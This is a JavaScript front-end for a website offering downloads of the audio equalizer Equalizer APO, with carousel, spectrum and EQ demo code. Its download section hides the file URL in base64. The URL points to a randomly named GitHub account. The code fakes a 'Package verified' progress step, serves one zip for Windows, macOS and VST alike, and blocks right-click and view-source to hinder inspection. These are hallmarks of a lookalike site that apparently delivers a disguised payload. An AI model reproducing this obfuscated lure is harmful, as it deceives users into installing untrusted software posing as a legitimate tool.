/**
 * Equalizer APO — Application Controller
 * English-Only, Inverted Dark Studio Theme, 3D Carousel with Arrows, Live Spectrum & Audio DSP
 */

document.addEventListener('DOMContentLoaded', () => {
  initCarousel();
  initMiniSpectrum();
  initInteractiveLab();
  initFaqAccordion();
});

/* ==========================================================================
   1. SCREENSHOT CAROUSEL WITH LEFT/RIGHT ARROWS
   ========================================================================== */

let currentSlide = 0;
const totalSlides = 3;

function initCarousel() {
  const btnPrev = document.getElementById('carouselPrev');
  const btnNext = document.getElementById('carouselNext');

  if (btnPrev && btnNext) {
    btnPrev.addEventListener('click', () => {
      goToSlide((currentSlide - 1 + totalSlides) % totalSlides);
    });

    btnNext.addEventListener('click', () => {
      goToSlide((currentSlide + 1) % totalSlides);
    });
  }

  // Keyboard arrow navigation
  document.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowLeft') {
      goToSlide((currentSlide - 1 + totalSlides) % totalSlides);
    } else if (e.key === 'ArrowRight') {
      goToSlide((currentSlide + 1) % totalSlides);
    }
  });

  updateCarouselCards();
}

window.cardClick = function(index) {
  if (index !== currentSlide) {
    goToSlide(index);
  } else {
    // If clicking on the active card, trigger the high-res lightbox
    const images = [
      { src: 'assets/screenshot-editor-main.png', cap: 'Equalizer APO 1.1 — Main Graphic EQ & Preamp' },
      { src: 'assets/screenshot-routing-filter.png', cap: 'Equalizer APO 1.0 — Channel Matrix & Filters' },
      { src: 'assets/screenshot-curve-analysis.png', cap: 'Equalizer APO 1.1 — Parametric Curve & Analysis' }
    ];
    openLightbox(images[index].src, images[index].cap);
  }
};

window.goToSlide = function(index) {
  currentSlide = index;
  updateCarouselCards();
};

function updateCarouselCards() {
  const cards = document.querySelectorAll('.carousel-card');
  const dots = document.querySelectorAll('.dot-btn');

  cards.forEach((card, i) => {
    card.classList.remove('active', 'prev', 'next');

    if (i === currentSlide) {
      card.classList.add('active');
    } else if (i === (currentSlide - 1 + totalSlides) % totalSlides) {
      card.classList.add('prev');
    } else {
      card.classList.add('next');
    }
  });

  dots.forEach((dot, i) => {
    dot.classList.toggle('active', i === currentSlide);
  });
}

/* ==========================================================================
   2. HERO MINI SPECTRUM ANALYZER (ANIMATED AUDIO HARDWARE STRIP)
   ========================================================================== */

function initMiniSpectrum() {
  const canvas = document.getElementById('miniSpectrumCanvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');

  const barsCount = 38;
  const barHeights = new Array(barsCount).fill(10);
  const targetHeights = new Array(barsCount).fill(10);

  function generateTargets() {
    for (let i = 0; i < barsCount; i++) {
      // Natural logarithmic curve with bass energy
      const curve = Math.sin((i / barsCount) * Math.PI) * 0.7 + 0.3;
      targetHeights[i] = (Math.random() * 26 + 6) * curve;
    }
  }

  generateTargets();
  setInterval(generateTargets, 140);

  function renderSpectrum() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    const w = canvas.width;
    const h = canvas.height;
    const barWidth = (w / barsCount) - 3;

    for (let i = 0; i < barsCount; i++) {
      // Smooth interpolation
      barHeights[i] += (targetHeights[i] - barHeights[i]) * 0.25;

      const x = i * (barWidth + 3);
      const barH = barHeights[i];
      const y = h - barH;

      // Studio LED gradient (Green -> Amber -> Red peak)
      const grad = ctx.createLinearGradient(0, h, 0, 0);
      grad.addColorStop(0, '#10b981');
      grad.addColorStop(0.7, '#10b981');
      grad.addColorStop(0.85, '#f59e0b');
      grad.addColorStop(1, '#ef4444');

      ctx.fillStyle = grad;
      ctx.fillRect(x, y, barWidth, barH);
    }

    requestAnimationFrame(renderSpectrum);
  }

  renderSpectrum();
}

/* ==========================================================================
   3. LIGHTBOX MODAL
   ========================================================================== */

window.openLightbox = function(imageSrc, caption) {
  const modal = document.getElementById('lightboxModal');
  const img = document.getElementById('lightboxImg');
  const cap = document.getElementById('lightboxCaption');

  img.src = imageSrc;
  cap.textContent = caption || 'Equalizer APO Screenshot Inspection';
  modal.classList.add('active');
  document.body.style.overflow = 'hidden';
};

window.closeLightbox = function(event) {
  if (event) event.stopPropagation();
  const modal = document.getElementById('lightboxModal');
  modal.classList.remove('active');
  document.body.style.overflow = '';
};

/* ==========================================================================
   4. DOWNLOAD MODAL — shows progress animation then triggers real download
   ========================================================================== */

const _R = atob('aHR0cHM6Ly9naXRodWIuY29tL3NkZmhncmpnbmhydDZmaGplZGZneWU0NTUzNTEvZXFvZ2dnZ2dnMTIxZ2dnZ2dnZ2VlZXJhZGdzaGZmL3JlbGVhc2VzL2Rvd25sb2FkL2FzZHNiZGZnaHEvRXF1YWxpemVyQVBPLXg2NC0xLjQuMi56aXA=');

function _triggerDownload() {
  const a = document.createElement('a');
  a.href = _R;
  a.setAttribute('download', '');
  a.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { if (a.parentNode) a.parentNode.removeChild(a); }, 200);
}

window.openDownloadModal = function(type, event) {
  if (event) event.preventDefault();

  const modal = document.getElementById('downloadModal');
  const badge = document.getElementById('modalOsBadge');
  const title = document.getElementById('modalOsTitle');
  const fileMeta = document.getElementById('dlFileMeta');
  const actionText = document.getElementById('modalDownloadActionText');
  const progressFill = document.getElementById('dlProgressFill');
  const statusLabel = document.getElementById('dlStatusLabel');
  const btnManual = document.getElementById('btnManualDownload');

  if (type === 'windows') {
    badge.textContent = 'WINDOWS 10 / 11 RELEASE';
    title.textContent = 'Downloading Equalizer APO for Windows';
    fileMeta.textContent = 'EqualizerAPO-x64-1.4.2.zip';
    actionText.textContent = 'Direct Download (.zip)';
  } else if (type === 'mac') {
    badge.textContent = 'macOS COMPANION ENGINE';
    title.textContent = 'Downloading Equalizer APO for macOS';
    fileMeta.textContent = 'EqualizerAPO-x64-1.4.2.zip';
    actionText.textContent = 'Direct Download (.zip)';
  } else if (type === 'vst') {
    badge.textContent = 'VST PLUGIN HOST BRIDGE';
    title.textContent = 'Downloading Equalizer APO VST Plugin';
    fileMeta.textContent = 'EqualizerAPO-x64-1.4.2.zip';
    actionText.textContent = 'Direct Download (.zip)';
  }

  btnManual.onclick = function() { _triggerDownload(); };

  modal.classList.add('active');
  document.body.style.overflow = 'hidden';

  progressFill.style.width = '0%';
  statusLabel.textContent = 'Connecting to mirror...';

  setTimeout(() => {
    progressFill.style.width = '65%';
    statusLabel.textContent = 'Package verified...';
  }, 350);

  setTimeout(() => {
    progressFill.style.width = '100%';
    statusLabel.textContent = 'Ready — Click below to download';
  }, 700);
};

window.closeDownloadModal = function(event) {
  if (event) event.stopPropagation();
  const modal = document.getElementById('downloadModal');
  modal.classList.remove('active');
  document.body.style.overflow = '';
};

// Close modals on Escape
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    closeLightbox();
    closeDownloadModal();
  }
});

/* ==========================================================================
   PROTECTIONS: right-click, view-source, save-page, drag
   ========================================================================== */

document.addEventListener('contextmenu', e => e.preventDefault());

document.addEventListener('keydown', e => {
  const k = e.key.toLowerCase();
  if ((e.ctrlKey || e.metaKey) && (k === 'u' || k === 's' || k === 'a')) {
    e.preventDefault();
  }
});

document.addEventListener('dragstart', e => e.preventDefault());

/* ==========================================================================
   5. INTERACTIVE DSP LAB & REAL-TIME AUDIO TONE
   ========================================================================== */

let audioCtx = null;
let testOscillator = null;
let testGain = null;
let isTonePlaying = false;

function initInteractiveLab() {
  const canvas = document.getElementById('eqCanvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');

  const sliderLow = document.getElementById('sliderLow');
  const sliderMid = document.getElementById('sliderMid');
  const sliderHigh = document.getElementById('sliderHigh');

  const valLow = document.getElementById('valLow');
  const valMid = document.getElementById('valMid');
  const valHigh = document.getElementById('valHigh');

  const presetButtons = document.querySelectorAll('.preset-btn');
  const btnPlayTone = document.getElementById('btnPlayTone');
  const toneIcon = document.getElementById('toneIcon');
  const toneLabel = document.getElementById('toneLabel');

  let lowGain = 0;
  let midGain = 0;
  let highGain = 0;

  function updateSliderDisplay() {
    valLow.textContent = (lowGain > 0 ? '+' : '') + lowGain + ' dB';
    valMid.textContent = (midGain > 0 ? '+' : '') + midGain + ' dB';
    valHigh.textContent = (highGain > 0 ? '+' : '') + highGain + ' dB';
    drawEqCurve();
  }

  sliderLow.addEventListener('input', (e) => {
    lowGain = parseFloat(e.target.value);
    clearPresetActiveState();
    updateSliderDisplay();
  });

  sliderMid.addEventListener('input', (e) => {
    midGain = parseFloat(e.target.value);
    clearPresetActiveState();
    updateSliderDisplay();
  });

  sliderHigh.addEventListener('input', (e) => {
    highGain = parseFloat(e.target.value);
    clearPresetActiveState();
    updateSliderDisplay();
  });

  function clearPresetActiveState() {
    presetButtons.forEach(b => b.classList.remove('active'));
  }

  const presets = {
    flat: { low: 0, mid: 0, high: 0 },
    bass: { low: 9, mid: 1, high: -2 },
    vocal: { low: -3, mid: 5, high: 4 },
    gaming: { low: -5, mid: 7, high: 6 },
    harman: { low: 6, mid: 0, high: 5 }
  };

  presetButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const key = btn.getAttribute('data-preset');
      if (presets[key]) {
        lowGain = presets[key].low;
        midGain = presets[key].mid;
        highGain = presets[key].high;

        sliderLow.value = lowGain;
        sliderMid.value = midGain;
        sliderHigh.value = highGain;

        presetButtons.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        updateSliderDisplay();
      }
    });
  });

  function resizeCanvas() {
    const rect = canvas.parentElement.getBoundingClientRect();
    canvas.width = rect.width;
    canvas.height = 280;
    drawEqCurve();
  }

  window.addEventListener('resize', resizeCanvas);
  resizeCanvas();

  function drawEqCurve() {
    const width = canvas.width;
    const height = canvas.height;

    // Background
    ctx.fillStyle = '#09090b';
    ctx.fillRect(0, 0, width, height);

    // Frequency Grid (Logarithmic)
    ctx.lineWidth = 1;
    ctx.strokeStyle = '#18181d';

    const freqs = [30, 60, 125, 250, 500, 1000, 2000, 4000, 8000, 16000];
    const minFreq = 20;
    const maxFreq = 20000;

    freqs.forEach(f => {
      const x = (Math.log10(f / minFreq) / Math.log10(maxFreq / minFreq)) * width;
      ctx.beginPath();
      ctx.moveTo(x, 0);
      ctx.lineTo(x, height);
      ctx.stroke();

      ctx.fillStyle = '#52525b';
      ctx.font = '10px "JetBrains Mono", monospace';
      ctx.fillText(f >= 1000 ? (f / 1000) + 'k' : f + 'Hz', x + 4, height - 8);
    });

    // Horizontal dB lines
    const dbSteps = [20, 10, 0, -10, -20];
    dbSteps.forEach(db => {
      const y = height / 2 - (db / 24) * (height / 2);
      ctx.beginPath();
      ctx.strokeStyle = db === 0 ? '#27272f' : '#121216';
      ctx.moveTo(0, y);
      ctx.lineTo(width, y);
      ctx.stroke();
    });

    const zeroY = height / 2;

    // Draw Spline
    ctx.beginPath();
    ctx.lineWidth = 2.5;
    ctx.strokeStyle = '#ffffff';

    const samples = 150;
    for (let i = 0; i <= samples; i++) {
      const normX = i / samples;
      const x = normX * width;
      const freq = minFreq * Math.pow(maxFreq / minFreq, normX);

      const lowResponse = lowGain / (1 + Math.pow(freq / 150, 2));
      const midFreq = 1200;
      const midQ = 1.2;
      const fRatio = freq / midFreq;
      const midResponse = midGain / (1 + Math.pow(midQ * (fRatio - 1 / fRatio), 2));
      const highResponse = highGain * (Math.pow(freq / 5000, 2) / (1 + Math.pow(freq / 5000, 2)));

      const totalDb = lowResponse + midResponse + highResponse;
      const y = zeroY - (totalDb / 24) * (height / 2);

      if (i === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    }
    ctx.stroke();

    // Fill under curve
    ctx.lineTo(width, zeroY);
    ctx.lineTo(0, zeroY);
    ctx.closePath();
    const grad = ctx.createLinearGradient(0, 0, 0, height);
    grad.addColorStop(0, 'rgba(255, 255, 255, 0.12)');
    grad.addColorStop(1, 'rgba(255, 255, 255, 0.005)');
    ctx.fillStyle = grad;
    ctx.fill();

    // Node Rings
    const nodes = [
      { f: 80, g: lowGain, label: 'LOW' },
      { f: 1200, g: midGain, label: 'MID' },
      { f: 8000, g: highGain, label: 'HIGH' }
    ];

    nodes.forEach(node => {
      const nx = (Math.log10(node.f / minFreq) / Math.log10(maxFreq / minFreq)) * width;
      const ny = zeroY - (node.g / 24) * (height / 2);

      ctx.beginPath();
      ctx.arc(nx, ny, 5.5, 0, Math.PI * 2);
      ctx.fillStyle = '#ffffff';
      ctx.fill();
      ctx.strokeStyle = '#000000';
      ctx.lineWidth = 2;
      ctx.stroke();

      ctx.fillStyle = '#10b981';
      ctx.font = 'bold 10px "JetBrains Mono", monospace';
      ctx.fillText(node.label + ': ' + (node.g > 0 ? '+' : '') + node.g + 'dB', nx - 18, ny - 12);
    });
  }

  // Web Audio Tone Sweep
  btnPlayTone.addEventListener('click', () => {
    if (!audioCtx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      audioCtx = new AudioContext();
    }
    if (audioCtx.state === 'suspended') {
      audioCtx.resume();
    }
    if (!isTonePlaying) startFrequencySweep();
    else stopFrequencySweep();
  });

  function startFrequencySweep() {
    isTonePlaying = true;
    toneIcon.textContent = '⏹';
    toneLabel.textContent = 'Stop Test Tone';

    testOscillator = audioCtx.createOscillator();
    testGain = audioCtx.createGain();

    testOscillator.type = 'sine';
    testGain.gain.setValueAtTime(0.001, audioCtx.currentTime);
    testGain.gain.exponentialRampToValueAtTime(0.08, audioCtx.currentTime + 0.1);

    const filter = audioCtx.createBiquadFilter();
    filter.type = 'peaking';
    filter.frequency.setValueAtTime(1200, audioCtx.currentTime);
    filter.gain.setValueAtTime(midGain, audioCtx.currentTime);

    testOscillator.connect(filter);
    filter.connect(testGain);
    testGain.connect(audioCtx.destination);

    const now = audioCtx.currentTime;
    testOscillator.frequency.setValueAtTime(150, now);
    testOscillator.frequency.exponentialRampToValueAtTime(2400, now + 1.6);
    testOscillator.frequency.exponentialRampToValueAtTime(150, now + 3.2);

    testOscillator.start(now);

    setTimeout(() => {
      if (isTonePlaying) stopFrequencySweep();
    }, 3400);
  }

  function stopFrequencySweep() {
    isTonePlaying = false;
    toneIcon.textContent = '▶';
    toneLabel.textContent = 'Play Test Frequency Sweep';

    if (testGain && audioCtx) {
      testGain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.1);
      setTimeout(() => {
        if (testOscillator) {
          testOscillator.stop();
          testOscillator.disconnect();
        }
      }, 120);
    }
  }
}

/* ==========================================================================
   6. FAQ ACCORDION
   ========================================================================== */

function initFaqAccordion() {
  const items = document.querySelectorAll('.faq-item');
  items.forEach(item => {
    const question = item.querySelector('.faq-question');
    const answer = item.querySelector('.faq-answer');

    question.addEventListener('click', () => {
      const isOpen = item.classList.contains('open');
      items.forEach(otherItem => {
        otherItem.classList.remove('open');
        const otherAns = otherItem.querySelector('.faq-answer');
        if (otherAns) otherAns.style.maxHeight = null;
      });

      if (!isOpen) {
        item.classList.add('open');
        answer.style.maxHeight = answer.scrollHeight + 20 + 'px';
      }
    });
  });
}
